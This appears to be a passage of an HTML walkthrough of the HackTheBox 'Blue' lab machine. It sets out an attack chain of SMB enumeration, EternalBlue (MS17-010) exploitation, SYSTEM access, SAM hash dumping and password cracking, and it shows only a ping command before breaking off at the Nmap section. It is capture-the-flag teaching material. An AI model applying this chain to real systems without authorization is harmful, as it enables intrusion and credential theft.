@@ -1,0 +1,1355 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Windows Blue Machine - EternalBlue Exploitation Walkthrough</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@300;400;500;600;700&family=Orbitron:wght@400;500;600;700;800;900&display=swap');
+:root{--bg-primary:#0a0e14;--bg-secondary:#111820;--bg-card:#141c28;--bg-glass:rgba(16,24,36,0.75);--neon-blue:#00b4d8;--neon-cyan:#00e5ff;--neon-blue-dim:rgba(0,180,216,0.15);--text-primary:#e8edf5;--text-secondary:#8899b4;--text-muted:#5a6a85;--accent-red:#ff3355;--accent-green:#00ff88;--accent-yellow:#ffcc00;--border-color:rgba(0,180,216,0.2);--terminal-bg:#0d1117;--radius:12px;--radius-sm:8px}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:'Inter',sans-serif;background:var(--bg-primary);color:var(--text-primary);line-height:1.7;overflow-x:hidden}
+::-webkit-scrollbar{width:6px}
+::-webkit-scrollbar-track{background:var(--bg-primary)}
+::-webkit-scrollbar-thumb{background:var(--neon-blue);border-radius:3px}
+::selection{background:var(--neon-blue);color:#000}
+h1,h2,h3,h4,h5{font-family:'Orbitron',sans-serif;font-weight:700;letter-spacing:0.02em}
+pre,code,.terminal,.cmd-text{font-family:'JetBrains Mono',monospace}
+.hero{position:relative;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:2rem;overflow:hidden;background:linear-gradient(135deg,#0a0e14 0%,#0d1a2b 40%,#0a1628 70%,#0a0e14 100%)}
+#hero-canvas{position:absolute;top:0;left:0;width:100%;height:100%;z-index:0;opacity:0.5}
+.hero-content{position:relative;z-index:1;max-width:900px}
+.hero-badge{display:inline-block;font-family:'JetBrains Mono',monospace;font-size:0.75rem;letter-spacing:0.25em;color:var(--neon-cyan);background:rgba(0,229,255,0.08);border:1px solid rgba(0,229,255,0.2);padding:0.5rem 1.5rem;border-radius:100px;margin-bottom:1.5rem;text-transform:uppercase;font-weight:500}
+.hero h1{font-size:clamp(2.5rem,6vw,5rem);font-weight:900;line-height:1.1;margin-bottom:1.2rem;background:linear-gradient(135deg,#00b4d8 0%,#00e5ff 40%,#0077b6 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.hero p{font-size:clamp(1rem,1.6vw,1.2rem);color:var(--text-secondary);max-width:750px;margin:0 auto 2.5rem;line-height:1.8}
+.hero-actions{display:flex;gap:1rem;justify-content:center;flex-wrap:wrap}
+.btn{font-family:'Orbitron',sans-serif;font-weight:600;font-size:0.85rem;letter-spacing:0.08em;padding:1rem 2.5rem;border-radius:var(--radius-sm);border:none;cursor:pointer;transition:all 0.3s ease;text-transform:uppercase}
+.btn-primary{background:linear-gradient(135deg,var(--neon-blue),#0077b6);color:#fff;box-shadow:0 0 30px rgba(0,180,216,0.3)}
+.btn-primary:hover{transform:translateY(-2px);box-shadow:0 0 50px rgba(0,180,216,0.5)}
+.btn-secondary{background:transparent;color:var(--neon-cyan);border:1px solid rgba(0,229,255,0.3)}
+.btn-secondary:hover{background:rgba(0,229,255,0.08);border-color:var(--neon-cyan);transform:translateY(-2px)}
+.hero-logs{position:relative;z-index:1;margin-top:3rem;max-width:600px;width:100%;text-align:left}
+.log-line{font-family:'JetBrains Mono',monospace;font-size:0.8rem;color:var(--text-muted);opacity:0;animation:logFadeIn 0.5s ease forwards;padding:0.2rem 0;display:flex;align-items:center;gap:0.75rem}
+.log-line .log-dot{width:6px;height:6px;border-radius:50%;flex-shrink:0;display:inline-block}
+.log-dot.green{background:var(--accent-green);box-shadow:0 0 8px var(--accent-green)}.log-dot.cyan{background:var(--neon-cyan);box-shadow:0 0 8px var(--neon-cyan)}.log-dot.red{background:var(--accent-red);box-shadow:0 0 8px var(--accent-red)}.log-dot.yellow{background:var(--accent-yellow);box-shadow:0 0 8px var(--accent-yellow)}
+@keyframes logFadeIn{to{opacity:1;transform:translateY(0)}}
+.floating-nav{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(10,14,20,0.9);backdrop-filter:blur(20px);border-bottom:1px solid var(--border-color);padding:0 2rem;height:56px;display:flex;align-items:center;justify-content:space-between;transform:translateY(-100%);transition:transform 0.4s ease}
+.floating-nav.visible{transform:translateY(0)}.floating-nav .nav-brand{font-family:'Orbitron',sans-serif;font-size:0.85rem;font-weight:700;color:var(--neon-cyan);letter-spacing:0.1em}
+.floating-nav .nav-progress{flex:1;max-width:400px;margin:0 2rem;height:3px;background:rgba(255,255,255,0.06);border-radius:2px;overflow:hidden}
+.floating-nav .nav-progress-bar{height:100%;width:0%;background:linear-gradient(90deg,var(--neon-blue),var(--neon-cyan));border-radius:2px;transition:width 0.3s ease}
+.section{max-width:1200px;margin:0 auto;padding:5rem 2rem}.section-header{text-align:center;margin-bottom:4rem}
+.section-number{font-family:'JetBrains Mono',monospace;font-size:0.75rem;font-weight:600;letter-spacing:0.2em;color:var(--neon-cyan);background:rgba(0,229,255,0.06);border:1px solid rgba(0,229,255,0.15);display:inline-block;padding:0.35rem 1.2rem;border-radius:100px;margin-bottom:1rem;text-transform:uppercase}
+.section-header h2{font-size:clamp(1.8rem,3vw,2.8rem);font-weight:800;margin-bottom:1rem;background:linear-gradient(135deg,#e8edf5 0%,var(--neon-blue) 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.section-header p{color:var(--text-secondary);font-size:1.05rem;max-width:650px;margin:0 auto}
+.card{background:var(--bg-glass);backdrop-filter:blur(10px);border:1px solid var(--border-color);border-radius:var(--radius);padding:1.5rem;transition:all 0.3s ease}
+.card:hover{border-color:rgba(0,180,216,0.4);box-shadow:0 0 30px rgba(0,180,216,0.08);transform:translateY(-2px)}
+.card-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:1.5rem}
+.card-icon{width:48px;height:48px;border-radius:var(--radius-sm);background:var(--neon-blue-dim);border:1px solid rgba(0,180,216,0.2);display:flex;align-items:center;justify-content:center;font-size:1.3rem;margin-bottom:1rem;color:var(--neon-cyan);font-family:'Orbitron',sans-serif;font-weight:700}
+.card h3{font-family:'Inter',sans-serif;font-size:1.1rem;font-weight:600;margin-bottom:0.5rem;color:var(--text-primary)}
+.card p{color:var(--text-secondary);font-size:0.9rem;line-height:1.6}
+.terminal{background:var(--terminal-bg);border:1px solid rgba(0,180,216,0.15);border-radius:var(--radius);overflow:hidden;margin:1.5rem 0}
+.terminal-header{background:rgba(0,0,0,0.3);padding:0.6rem 1rem;display:flex;align-items:center;gap:0.5rem;border-bottom:1px solid rgba(255,255,255,0.05)}
+.terminal-dot{width:10px;height:10px;border-radius:50%}.terminal-dot.red{background:#ff5f56}.terminal-dot.yellow{background:#ffbd2e}.terminal-dot.green{background:#27c93f}
+.terminal-title{font-size:0.75rem;color:var(--text-muted);margin-left:0.5rem;font-family:'JetBrains Mono',monospace}
+.terminal-body{padding:1.25rem 1.5rem;font-family:'JetBrains Mono',monospace;font-size:0.85rem;line-height:1.7;color:var(--text-secondary);white-space:pre-wrap;word-break:break-word}
+.terminal-body .prompt{color:var(--accent-green)}.terminal-body .cmd{color:var(--text-primary)}.terminal-body .output{color:var(--text-secondary)}
+.terminal-body .highlight{color:var(--neon-cyan)}.terminal-body .success{color:var(--accent-green)}.terminal-body .error{color:var(--accent-red)}.terminal-body .warn{color:var(--accent-yellow)}
+.flag-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:1rem;margin:1.5rem 0}
+.flag-item{background:var(--bg-card);border:1px solid var(--border-color);border-radius:var(--radius-sm);padding:1rem;text-align:center;transition:all 0.3s ease;cursor:default}
+.flag-item:hover{border-color:var(--neon-blue);box-shadow:0 0 20px rgba(0,180,216,0.1)}
+.flag-item .flag-flag{font-family:'JetBrains Mono',monospace;font-size:0.9rem;font-weight:600;color:var(--neon-cyan);margin-bottom:0.3rem}
+.flag-item .flag-desc{font-size:0.8rem;color:var(--text-muted)}
+.flow-node{width:100%;max-width:500px;background:var(--bg-glass);backdrop-filter:blur(10px);border:1px solid var(--border-color);border-radius:var(--radius);padding:1.2rem 1.5rem;cursor:pointer;transition:all 0.3s ease;position:relative;text-align:center;margin:0.3rem 0}
+.flow-node:hover,.flow-node.active{border-color:var(--neon-blue);box-shadow:0 0 30px rgba(0,180,216,0.15);transform:scale(1.02)}
+.flow-node .fn-title{font-family:'Orbitron',sans-serif;font-size:0.85rem;font-weight:600;color:var(--neon-cyan);letter-spacing:0.06em}
+.flow-node .fn-detail{display:none;margin-top:0.75rem;font-size:0.85rem;color:var(--text-secondary);text-align:left;line-height:1.6}
+.flow-node.active .fn-detail{display:block}
+.flow-arrow{color:var(--text-muted);font-size:1.2rem;padding:0.3rem 0;text-align:center;font-family:'JetBrains Mono',monospace}
+.attack-flow{display:flex;flex-direction:column;align-items:center;padding:2rem 0}
+.smb-vis{display:flex;align-items:center;justify-content:center;gap:1.5rem;padding:2rem;flex-wrap:wrap}
+.smb-node{width:120px;height:120px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-direction:column;background:var(--bg-card);border:2px solid var(--border-color);transition:all 0.3s ease;font-size:0.75rem;font-weight:500;text-align:center;padding:0.5rem}
+.smb-node.client{border-color:var(--neon-cyan)}.smb-node.server{border-color:var(--accent-green)}
+.smb-arrow{font-size:1.5rem;color:var(--text-muted);animation:pulseArrow 1.5s ease infinite}
+@keyframes pulseArrow{0%,100%{opacity:0.4;transform:translateX(0)}50%{opacity:1;transform:translateX(6px)}}
+.vuln-dashboard{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:1rem}
+.vuln-stat{background:var(--bg-card);border:1px solid var(--border-color);border-radius:var(--radius-sm);padding:1.25rem}
+.vuln-stat .vs-label{font-size:0.75rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.08em;font-weight:500;margin-bottom:0.3rem}
+.vuln-stat .vs-value{font-family:'JetBrains Mono',monospace;font-size:1.1rem;font-weight:600}
+.vuln-stat .vs-value.danger{color:var(--accent-red)}.vuln-stat .vs-value.good{color:var(--accent-green)}.vuln-stat .vs-value.info{color:var(--neon-cyan)}
+.exploit-vis{display:flex;flex-direction:column;align-items:center;gap:0.5rem;padding:2rem 0}
+.exploit-step{display:flex;align-items:center;gap:1rem;width:100%;max-width:600px;padding:0.8rem 1rem;background:var(--bg-card);border:1px solid var(--border-color);border-radius:var(--radius-sm);transition:all 0.3s ease}
+.exploit-step.animated{border-color:var(--neon-blue);background:var(--neon-blue-dim)}
+.exploit-step .es-num{width:28px;height:28px;border-radius:50%;background:var(--neon-blue-dim);border:1px solid rgba(0,180,216,0.3);display:flex;align-items:center;justify-content:center;font-family:'JetBrains Mono',monospace;font-size:0.75rem;font-weight:600;color:var(--neon-cyan);flex-shrink:0}
+.exploit-step .es-text{font-size:0.85rem;color:var(--text-secondary)}
+.priv-hierarchy{display:flex;flex-direction:column;align-items:center;gap:0.3rem;padding:2rem 0}
+.priv-level{width:80%;max-width:350px;padding:1rem 1.5rem;text-align:center;font-family:'Orbitron',sans-serif;font-size:0.9rem;font-weight:600;border-radius:var(--radius-sm);border:1px solid var(--border-color);background:var(--bg-card);transition:all 0.3s ease}
+.priv-level.system{border-color:var(--accent-red);background:rgba(255,51,85,0.08);color:var(--accent-red);box-shadow:0 0 30px rgba(255,51,85,0.15)}
+.priv-level.admin{border-color:var(--accent-yellow);color:var(--accent-yellow)}.priv-level.user{border-color:var(--neon-blue);color:var(--neon-cyan)}
+.priv-arrow{color:var(--text-muted);font-size:0.9rem}
+.cmd-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:0.75rem}
+.cmd-card{background:var(--bg-card);border:1px solid var(--border-color);border-radius:var(--radius-sm);padding:1rem;cursor:pointer;transition:all 0.3s ease}
+.cmd-card:hover{border-color:var(--neon-blue);box-shadow:0 0 15px rgba(0,180,216,0.08)}
+.cmd-card .cc-name{font-family:'JetBrains Mono',monospace;font-size:0.85rem;font-weight:600;color:var(--neon-cyan);margin-bottom:0.3rem}
+.cmd-card .cc-desc{font-size:0.8rem;color:var(--text-muted);line-height:1.5}
+.cmd-card .cc-detail{display:none;margin-top:0.5rem;font-size:0.8rem;color:var(--text-secondary);line-height:1.6;border-top:1px solid var(--border-color);padding-top:0.5rem}
+.cmd-card.active .cc-detail{display:block}
+.mind-map{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:1rem}
+.mind-node{background:var(--bg-glass);backdrop-filter:blur(10px);border:1px solid var(--border-color);border-radius:var(--radius);padding:1.25rem;text-align:center;transition:all 0.3s ease}
+.mind-node:hover{border-color:var(--neon-blue);box-shadow:0 0 20px rgba(0,180,216,0.1)}
+.mind-node .mn-q{font-size:0.9rem;font-weight:500;color:var(--neon-cyan);margin-bottom:0.5rem;font-style:italic}
+.mind-node .mn-a{font-size:0.85rem;color:var(--text-secondary);line-height:1.6}
+.defense-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:1rem}
+.defense-card{background:var(--bg-card);border:1px solid var(--border-color);border-radius:var(--radius-sm);padding:1.25rem;border-left:3px solid var(--accent-green)}
+.defense-card.attack{border-left-color:var(--accent-red)}
+.defense-card .dc-title{font-family:'Orbitron',sans-serif;font-size:0.8rem;font-weight:600;color:var(--text-primary);margin-bottom:0.5rem;letter-spacing:0.04em}
+.defense-card .dc-why{font-size:0.85rem;color:var(--accent-red);margin-bottom:0.4rem}.defense-card .dc-fix{font-size:0.85rem;color:var(--accent-green)}
+.conclusion-chain{display:flex;flex-direction:column;align-items:center;gap:0.3rem;padding:2rem 0}
+.chain-node{padding:0.8rem 2rem;background:var(--bg-glass);backdrop-filter:blur(10px);border:1px solid var(--border-color);border-radius:var(--radius-sm);text-align:center;color:var(--text-secondary);transition:all 0.3s ease;font-family:'Orbitron',sans-serif;font-size:0.8rem;letter-spacing:0.04em}
+.chain-node:hover{border-color:var(--neon-blue);color:var(--neon-cyan)}
+.lab-panel{background:var(--bg-glass);backdrop-filter:blur(10px);border:1px solid var(--border-color);border-radius:var(--radius);padding:1.5rem;margin:1rem 0}
+.lab-panel h4{font-family:'Inter',sans-serif;font-size:1rem;font-weight:600;color:var(--neon-cyan);margin-bottom:0.75rem}
+.lab-input{width:100%;background:var(--terminal-bg);border:1px solid var(--border-color);border-radius:var(--radius-sm);padding:0.75rem 1rem;color:var(--text-primary);font-family:'JetBrains Mono',monospace;font-size:0.85rem;outline:none;transition:border-color 0.3s ease}
+.lab-input:focus{border-color:var(--neon-blue)}
+.lab-btn{margin-top:0.75rem;font-family:'Orbitron',sans-serif;font-size:0.75rem;font-weight:600;letter-spacing:0.06em;padding:0.6rem 1.5rem;border-radius:var(--radius-sm);border:none;cursor:pointer;background:linear-gradient(135deg,var(--neon-blue),#0077b6);color:#fff;text-transform:uppercase;transition:all 0.3s ease}
+.lab-btn:hover{box-shadow:0 0 20px rgba(0,180,216,0.3);transform:translateY(-1px)}
+.lab-result{margin-top:0.75rem;padding:0.75rem 1rem;background:var(--terminal-bg);border:1px solid var(--border-color);border-radius:var(--radius-sm);font-family:'JetBrains Mono',monospace;font-size:0.8rem;color:var(--text-secondary);min-height:40px;white-space:pre-wrap}
+.timeline{position:relative;padding:2rem 0}
+.timeline::before{content:'';position:absolute;left:50%;top:0;bottom:0;width:2px;background:linear-gradient(180deg,var(--neon-blue),var(--accent-red));transform:translateX(-50%);opacity:0.3}
+.tl-item{display:flex;align-items:flex-start;gap:2rem;margin-bottom:2rem;position:relative}
+.tl-item:nth-child(odd){flex-direction:row}.tl-item:nth-child(even){flex-direction:row-reverse}
+.tl-year{font-family:'Orbitron',sans-serif;font-size:0.9rem;font-weight:700;color:var(--neon-cyan);min-width:80px;text-align:center;padding:0.3rem 0;background:var(--bg-card);border:1px solid var(--border-color);border-radius:var(--radius-sm)}
+.tl-content{flex:1;background:var(--bg-glass);backdrop-filter:blur(10px);border:1px solid var(--border-color);border-radius:var(--radius);padding:1rem 1.25rem}
+.tl-content h4{font-family:'Inter',sans-serif;font-size:0.95rem;font-weight:600;color:var(--text-primary);margin-bottom:0.3rem}
+.tl-content p{font-size:0.85rem;color:var(--text-secondary);line-height:1.6}
+.file-tree{font-family:'JetBrains Mono',monospace;font-size:0.85rem;line-height:1.8;background:var(--terminal-bg);border:1px solid var(--border-color);border-radius:var(--radius);padding:1.25rem 1.5rem;color:var(--text-secondary)}
+.file-tree .ft-folder{color:var(--neon-cyan)}.file-tree .ft-file{color:var(--text-secondary)}.file-tree .ft-highlight{color:var(--accent-yellow);font-weight:600}.file-tree .indent{padding-left:1.5rem}
+.hash-display{display:flex;align-items:center;gap:1rem;flex-wrap:wrap;padding:1rem;background:var(--terminal-bg);border:1px solid var(--border-color);border-radius:var(--radius-sm);font-family:'JetBrains Mono',monospace;font-size:0.75rem;margin:0.5rem 0}
+.hash-display .hd-label{color:var(--text-muted);font-weight:500}.hash-display .hd-value{color:var(--neon-cyan);word-break:break-all}
+.quote-block{max-width:800px;margin:3rem auto;padding:2rem;text-align:center;border-top:1px solid var(--border-color);border-bottom:1px solid var(--border-color)}
+.quote-block blockquote{font-size:1.15rem;color:var(--text-secondary);font-style:italic;line-height:1.8}
+.quote-block .quote-author{margin-top:1rem;font-family:'Orbitron',sans-serif;font-size:0.75rem;color:var(--neon-cyan);letter-spacing:0.1em;text-transform:uppercase}
+.reveal{opacity:0;transform:translateY(30px);transition:all 0.6s ease}.reveal.visible{opacity:1;transform:translateY(0)}
+@media(max-width:768px){.section{padding:3rem 1.25rem}.hero h1{font-size:2rem}.hero-actions{flex-direction:column}.timeline::before{left:20px}.tl-item,.tl-item:nth-child(odd),.tl-item:nth-child(even){flex-direction:column;padding-left:2.5rem}.tl-year{min-width:auto;align-self:flex-start}.smb-vis{gap:0.75rem}.smb-node{width:80px;height:80px;font-size:0.65rem}}
+.os-badge{display:inline-flex;align-items:center;gap:0.5rem;background:rgba(0,180,216,0.08);border:1px solid rgba(0,180,216,0.2);border-radius:var(--radius-sm);padding:0.6rem 1.2rem;font-family:'JetBrains Mono',monospace;font-size:0.85rem;color:var(--neon-cyan);margin:1rem 0}
+.scroll-indicator{position:absolute;bottom:2rem;left:50%;transform:translateX(-50%);z-index:1;animation:bounce 2s ease infinite;color:var(--text-muted);font-size:1.5rem;cursor:pointer}
+@keyframes bounce{0%,100%{transform:translateX(-50%) translateY(0)}50%{transform:translateX(-50%) translateY(8px)}}
+.inline-code{font-family:'JetBrains Mono',monospace;font-size:0.85rem;background:rgba(0,180,216,0.1);border:1px solid rgba(0,180,216,0.15);padding:0.15rem 0.5rem;border-radius:4px;color:var(--neon-cyan)}
+.crack-anim{display:flex;align-items:center;justify-content:center;gap:1.5rem;padding:1.5rem;flex-wrap:wrap}
+.crack-box{padding:1rem 1.5rem;background:var(--bg-card);border:1px solid var(--border-color);border-radius:var(--radius-sm);text-align:center;font-family:'JetBrains Mono',monospace;font-size:0.8rem;word-break:break-all}
+.crack-box .cb-label{font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.08em;margin-bottom:0.3rem}
+.crack-box.hash{border-color:rgba(255,51,85,0.3)}.crack-box.hash .cb-value{color:var(--accent-red)}
+.crack-box.password{border-color:rgba(0,255,136,0.3)}.crack-box.password .cb-value{color:var(--accent-green);font-size:1.2rem}
+.crack-arrow{color:var(--neon-cyan);font-size:1.5rem;animation:pulseArrow 1.5s ease infinite}
+.services-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:1rem}
+.service-card{background:var(--bg-card);border:1px solid var(--border-color);border-radius:var(--radius-sm);padding:1rem;text-align:center;border-left:3px solid var(--neon-blue)}
+.service-card .sc-port{font-family:'JetBrains Mono',monospace;font-size:1.1rem;font-weight:600;color:var(--neon-cyan)}
+.service-card .sc-service{font-size:0.85rem;color:var(--text-secondary);margin-top:0.2rem}
+.service-card .sc-desc{font-size:0.75rem;color:var(--text-muted);margin-top:0.3rem}
+.service-card.important{border-left-color:var(--accent-red);background:rgba(255,51,85,0.05)}.service-card.important .sc-port{color:var(--accent-red)}
+</style>
+</head>
+<body>
+<nav class="floating-nav" id="floatingNav">
+  <span class="nav-brand">BLUE</span>
+  <div class="nav-progress"><div class="nav-progress-bar" id="navProgress"></div></div>
+  <span style="font-size:0.7rem;color:var(--text-muted);font-family:'JetBrains Mono',monospace;">MS17-010</span>
+</nav>
+<section class="hero" id="hero">
+  <canvas id="hero-canvas"></canvas>
+  <div class="hero-content">
+    <div class="hero-badge">Offensive Security Walkthrough</div>
+    <h1>Windows Blue Machine</h1>
+    <p>Understanding EternalBlue exploitation, SMB vulnerabilities, SYSTEM-level compromise, and post-exploitation methodology through a professional offensive security walkthrough.</p>
+    <div class="hero-actions">
+      <button class="btn btn-primary" onclick="document.getElementById('overview').scrollIntoView({behavior:'smooth'})">Start Walkthrough</button>
+      <button class="btn btn-secondary" onclick="document.getElementById('labs').scrollIntoView({behavior:'smooth'})">Launch Simulations</button>
+    </div>
+  </div>
+  <div class="hero-logs" id="heroLogs"></div>
+  <div class="scroll-indicator" onclick="document.getElementById('overview').scrollIntoView({behavior:'smooth'})">↓</div>
+</section>
+<section class="section" id="overview">
+  <div class="section-inner">
+    <div class="section-number">Section 01</div>
+    <h2 class="section-title">Machine Overview</h2>
+    <p class="section-desc">The Blue machine on HackTheBox offers a comprehensive journey into EternalBlue exploitation, SMB vulnerabilities, and post-exploitation methodology. This walkthrough covers the complete attack chain from reconnaissance to SYSTEM-level access.</p>
+    <div class="cards-grid">
+      <div class="card reveal">
+        <div class="card-icon">S</div>
+        <div class="card-icon-bg"></div>
+        <h3>SMB Exploitation</h3>
+        <p>Understanding and exploiting SMB service vulnerabilities on Windows targets through version enumeration and known CVEs.</p>
+      </div>
+      <div class="card reveal">
+        <div class="card-icon">E</div>
+        <div class="card-icon-bg"></div>
+        <h3>EternalBlue</h3>
+        <p>Leveraging the MS17-010 vulnerability to achieve remote code execution on unpatched Windows 7 systems via SMBv1.</p>
+      </div>
+      <div class="card reveal">
+        <div class="card-icon">S</div>
+        <div class="card-icon-bg"></div>
+        <h3>SYSTEM Access</h3>
+        <p>Escalating from initial access to NT AUTHORITY\SYSTEM privileges for complete control over the target machine.</p>
+      </div>
+      <div class="card reveal">
+        <div class="card-icon">M</div>
+        <div class="card-icon-bg"></div>
+        <h3>Meterpreter</h3>
+        <p>Using Metasploit's Meterpreter payload for advanced post-exploitation capabilities on the compromised target.</p>
+      </div>
+      <div class="card reveal">
+        <div class="card-icon">C</div>
+        <div class="card-icon-bg"></div>
+        <h3>Credential Dumping</h3>
+        <p>Extracting password hashes from the SAM database for offline cracking and lateral movement opportunities.</p>
+      </div>
+      <div class="card reveal">
+        <div class="card-icon">P</div>
+        <div class="card-icon-bg"></div>
+        <h3>Password Cracking</h3>
+        <p>Using John the Ripper to crack extracted NTLM hashes and recover plaintext credentials from the target.</p>
+      </div>
+      <div class="card reveal">
+        <div class="card-icon">P</div>
+        <div class="card-icon-bg"></div>
+        <h3>Post-Exploitation</h3>
+        <p>Exploring the compromised system, locating flags, and understanding the full impact of the security breach.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section section-alt" id="flow">
+  <div class="section-inner-full">
+    <div class="section-number">Section 02</div>
+    <h2 class="section-title">Attack Flow Overview</h2>
+    <p class="section-desc">Visualizing the complete attack chain from initial reconnaissance through post-exploitation on the Blue Windows 7 machine.</p>
+    <div class="flow-container">
+      <div class="flow-node" data-detail="Use Nmap to discover live hosts and identify open ports on the target network segment.">
+        <div class="flow-node-number">01</div>
+        <div class="flow-node-info">
+          <div class="flow-node-title">Reconnaissance</div>
+          <div class="flow-node-detail">Initial target discovery and network mapping</div>
+        </div>
+      </div>
+      <div class="flow-arrow">▼</div>
+      <div class="flow-node" data-detail="Perform comprehensive port scanning to enumerate all accessible services on the target.">
+        <div class="flow-node-number">02</div>
+        <div class="flow-node-info">
+          <div class="flow-node-title">Port Scanning</div>
+          <div class="flow-node-detail">Enumerate open ports and services</div>
+        </div>
+      </div>
+      <div class="flow-arrow">▼</div>
+      <div class="flow-node" data-detail="Enumerate SMB service details including version, protocols, and available shares.">
+        <div class="flow-node-number">03</div>
+        <div class="flow-node-info">
+          <div class="flow-node-title">SMB Enumeration</div>
+          <div class="flow-node-detail">Identify SMB version and configuration</div>
+        </div>
+      </div>
+      <div class="flow-arrow">▼</div>
+      <div class="flow-node" data-detail="Use Nmap scripts and auxiliary modules to check for MS17-010 vulnerability status.">
+        <div class="flow-node-number">04</div>
+        <div class="flow-node-info">
+          <div class="flow-node-title">MS17-010 Detection</div>
+          <div class="flow-node-detail">Confirm vulnerability presence</div>
+        </div>
+      </div>
+      <div class="flow-arrow">▼</div>
+      <div class="flow-node" data-detail="Deploy the EternalBlue exploit module against the vulnerable SMB service to gain initial access.">
+        <div class="flow-node-number">05</div>
+        <div class="flow-node-info">
+          <div class="flow-node-title">EternalBlue Exploitation</div>
+          <div class="flow-node-detail">Execute MS17-010 exploit</div>
+        </div>
+      </div>
+      <div class="flow-arrow">▼</div>
+      <div class="flow-node" data-detail="Achieve SYSTEM-level privileges on the target, bypassing standard user account controls.">
+        <div class="flow-node-number">06</div>
+        <div class="flow-node-info">
+          <div class="flow-node-title">SYSTEM Access</div>
+          <div class="flow-node-detail">Highest privilege level achieved</div>
+        </div>
+      </div>
+      <div class="flow-arrow">▼</div>
+      <div class="flow-node" data-detail="Extract password hashes from the SAM database for offline analysis and credential reuse.">
+        <div class="flow-node-number">07</div>
+        <div class="flow-node-info">
+          <div class="flow-node-title">Credential Dumping</div>
+          <div class="flow-node-detail">Extract password hashes from SAM</div>
+        </div>
+      </div>
+      <div class="flow-arrow">▼</div>
+      <div class="flow-node" data-detail="Crack the extracted NTLM hashes using John the Ripper with a wordlist to recover plaintext passwords.">
+        <div class="flow-node-number">08</div>
+        <div class="flow-node-info">
+          <div class="flow-node-title">Password Cracking</div>
+          <div class="flow-node-detail">Crack NTLM hashes offline</div>
+        </div>
+      </div>
+      <div class="flow-arrow">▼</div>
+      <div class="flow-node" data-detail="Perform thorough post-exploitation: enumerate the filesystem, locate flags, and discover sensitive data.">
+        <div class="flow-node-number">09</div>
+        <div class="flow-node-info">
+          <div class="flow-node-title">Post-Exploitation</div>
+          <div class="flow-node-detail">Enumerate and extract valuable data</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="recon">
+  <div class="section-inner">
+    <div class="section-number">Section 03</div>
+    <h2 class="section-title">Reconnaissance Phase</h2>
+    <p class="section-desc">The first step in any penetration test is understanding your target. Reconnaissance involves gathering information about the target system, network, and potential attack vectors before launching any exploits.</p>
+    <div class="info-card">
+      <h3>What is Reconnaissance?</h3>
+      <p>In the context of the Blue machine, reconnaissance involves identifying that the target is a Windows 7 system, discovering its IP address, and understanding what services it is running. This phase sets the foundation for all subsequent exploitation steps.</p>
+    </div>
+    <div class="cards-grid">
+      <div class="card reveal">
+        <div class="card-icon">A</div>
+        <div class="card-icon-bg"></div>
+        <h3>Active Host Discovery</h3>
+        <p>Using ping sweeps and network scans to identify live hosts on the target subnet before focusing on specific machines.</p>
+      </div>
+      <div class="card reveal">
+        <div class="card-icon">O</div>
+        <div class="card-icon-bg"></div>
+        <h3>Open Port Detection</h3>
+        <p>Scanning for open ports to understand which services are accessible, revealing potential entry points for exploitation.</p>
+      </div>
+      <div class="card reveal">
+        <div class="card-icon">S</div>
+        <div class="card-icon-bg"></div>
+        <h3>Service Fingerprinting</h3>
+        <p>Determining exact service versions and configurations to identify vulnerable software and plan targeted attacks.</p>
+      </div>
+      <div class="card reveal">
+        <div class="card-icon">M</div>
+        <div class="card-icon-bg"></div>
+        <h3>Attack Surface Mapping</h3>
+        <p>Creating a comprehensive map of all potential attack vectors based on discovered services, versions, and configurations.</p>
+      </div>
+    </div>
+    <div class="terminal">
+      <div class="terminal-header">
+        <span class="terminal-dot red"></span>
+        <span class="terminal-dot yellow"></span>
+        <span class="terminal-dot green"></span>
+        <span class="terminal-title">ping-test.ps1</span>
+      </div>
+      <div class="terminal-body">
+<span class="prompt">kali@attacker:~$</span> <span class="cmd">ping -c 4 10.10.10.10</span>
+<span class="output">PING 10.10.10.10 (10.10.10.10) 56(84) bytes of data.</span>
+<span class="success">64 bytes from 10.10.10.10: icmp_seq=1 ttl=127 time=1.04 ms</span>
+<span class="success">64 bytes from 10.10.10.10: icmp_seq=2 ttl=127 time=0.98 ms</span>
+<span class="success">64 bytes from 10.10.10.10: icmp_seq=3 ttl=127 time=1.12 ms</span>
+<span class="success">64 bytes from 10.10.10.10: icmp_seq=4 ttl=127 time=0.95 ms</span>
+<span class="output">--- 10.10.10.10 ping statistics ---</span>
+<span class="output">4 packets transmitted, 4 received, 0% packet loss, time 3002ms</span>
+<span class="highlight">rtt min/avg/max/mdev = 0.95/1.02/1.12/0.07 ms</span>
+<span class="output">Target is alive. TTL of 127 suggests Windows OS.</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section section-alt" id="nmap">
+  <div class="section-inner-full">
+    <div class="section-number">Section 04</div>
+    <h2 class="section-title">Nmap Enumeration</h2>
+    <p class="section-desc">Nmap is used to perform a detailed port scan of the target, revealing critical services running on the Windows 7 machine, including SMB on port 445.</p>
+    <div class="terminal">
+      <div class="terminal-header">
+        <span class="terminal-dot red"></span>
+        <span class="terminal-dot yellow"></span>
+        <span class="terminal-dot green"></span>
+        <span class="terminal-title">nmap-scan.ps1</span>
+      </div>
